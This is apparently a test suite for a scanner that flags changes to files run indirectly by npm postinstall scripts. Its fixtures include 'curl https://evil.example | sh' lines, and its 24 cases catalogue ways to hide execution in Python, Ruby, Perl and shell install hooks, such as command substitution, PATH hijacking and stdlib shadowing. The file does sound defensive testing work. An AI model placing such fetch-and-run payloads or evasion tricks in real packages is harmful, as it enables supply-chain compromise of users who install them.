import { expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const hard = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
const sh = "curl https://evil.example | sh\n";
const py = "import os\nos.system('curl evil|sh')\n";
const mk = "#!/bin/sh\ncurl https://evil.example | sh\n";

function holds(base: Record<string, string>, file: string, bad: string) {
  const changed = hard(base, { ...base, [file]: bad });
  expect(changed.length).toBeGreaterThan(0);
  expect(changed.join(" ")).toMatch(new RegExp(file.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  expect(hard(base, base)).toEqual([]);
}

const pyE = (body: string, f: string, extra: Record<string, string> = {}) => ({
  "package.json": pj({ postinstall: "python3 install.py" }),
  "install.py": body,
  [f]: "true\n",
  "README.md": "a\n",
  ...extra,
});
const rbE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "ruby install.rb" }),
  "install.rb": body,
  [f]: "true\n",
  "README.md": "a\n",
});
const shE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "sh install.sh" }),
  "install.sh": body,
  [f]: "true\n",
  "README.md": "a\n",
});
const plE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "perl install.pl" }),
  "install.pl": body,
  [f]: "true\n",
  "README.md": "a\n",
});

// An allowlisted statement is static only when each argument is a literal or a bare name.
// M4, M5, M8, M21, M22, M23, and M24 still name one file, so README stays quiet.
const cases: [string, Record<string, string>, string, string, boolean][] = [
  ["M1 py f-string call in print", pyE("import os\nprint(f\"{os.system('sh docs/run.sh')}\")\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["M2 py vars() call in print", pyE("import os\nprint(vars(os)['system']('sh docs/run.sh'))\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["M3 py f-string assignment", pyE("import os\nx = f\"{os.system('sh docs/run.sh')}\"\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["M4 py stdlib shadow json.py", pyE("import json\nprint('ok')\n", "json.py"), "json.py", py, true],
  ["M5 py stdlib shadow subprocess.py", pyE("import subprocess\nprint(1)\n", "subprocess.py"), "subprocess.py", py, true],
  ["M6 rb interpolation in puts", rbE("puts \"#{system('sh docs/run.sh')}\"\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["M7 rb interpolation assignment", rbE("x = \"#{`sh docs/run.sh`}\"\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["M8 pl array interpolation in print", plE("print \"@{[ system('sh docs/run.sh') ]}\";\n", "docs/run.sh"), "docs/run.sh", sh, true],
  ["M9 sh echo command substitution", shE("echo \"$(sh docs/run.sh)\"\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["M10 sh echo backticks", shE("echo `sh docs/run.sh`\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["M11 sh assignment command substitution", shE("X=$(sh docs/run.sh)\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["M12 sh test command substitution", shE("[ -n \"$(. docs/run.sh)\" ]\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["M13 sh mkdir command substitution", shE("mkdir -p \"$(sh docs/run.sh)build\"\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["M14 sh cd command substitution", shE("cd \"$(sh docs/run.sh)\"\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["M15 sh arithmetic expansion", shE("exit $(( $(sh docs/run.sh) + 0 ))\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["M16 sh PATH then mkdir", shE("PATH=docs:$PATH\nmkdir -p build\n", "docs/mkdir"), "docs/mkdir", mk, false],
  ["M17 sh cd then mkdir with dot PATH", shE("PATH=.:$PATH\ncd docs\nmkdir -p build\n", "docs/mkdir"), "docs/mkdir", mk, false],
  ["M18 sh echo heredoc substitution", shE("cat > /dev/null <<EOF\n$(sh docs/run.sh)\nEOF\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["M19 sh printf format substitution", shE("printf '%s\\n' \"${X:-$(sh docs/run.sh)}\"\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["M20 sh echo redirect from substitution", shE("echo hi > \"$(sh docs/run.sh)\"\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["M21 sh test -f then dot-source", shE("[ -f docs/run.sh ] && . ./docs/run.sh\n", "docs/run.sh"), "docs/run.sh", sh, true],
  ["M22 sh line continuation", shE("echo \\\n; sh docs/run.sh\n", "docs/run.sh"), "docs/run.sh", sh, true],
  ["M23 sh semicolon after echo", shE("echo hi; sh docs/run.sh\n", "docs/run.sh"), "docs/run.sh", sh, true],
  ["M24 sh echo pipe sh", shE("echo 'sh docs/run.sh' | sh\n", "docs/run.sh"), "docs/run.sh", sh, true],
];

for (const [name, base, file, bad, readmeQuiet] of cases) {
  test(`${name} holds, and the unchanged twin is quiet`, () => {
    holds(base, file, bad);
    const readme = hard(base, { ...base, "README.md": "b\n" });
    if (readmeQuiet) expect(readme).toEqual([]);
    else expect(readme.join(" ")).toMatch(/README\.md/);
  });
}
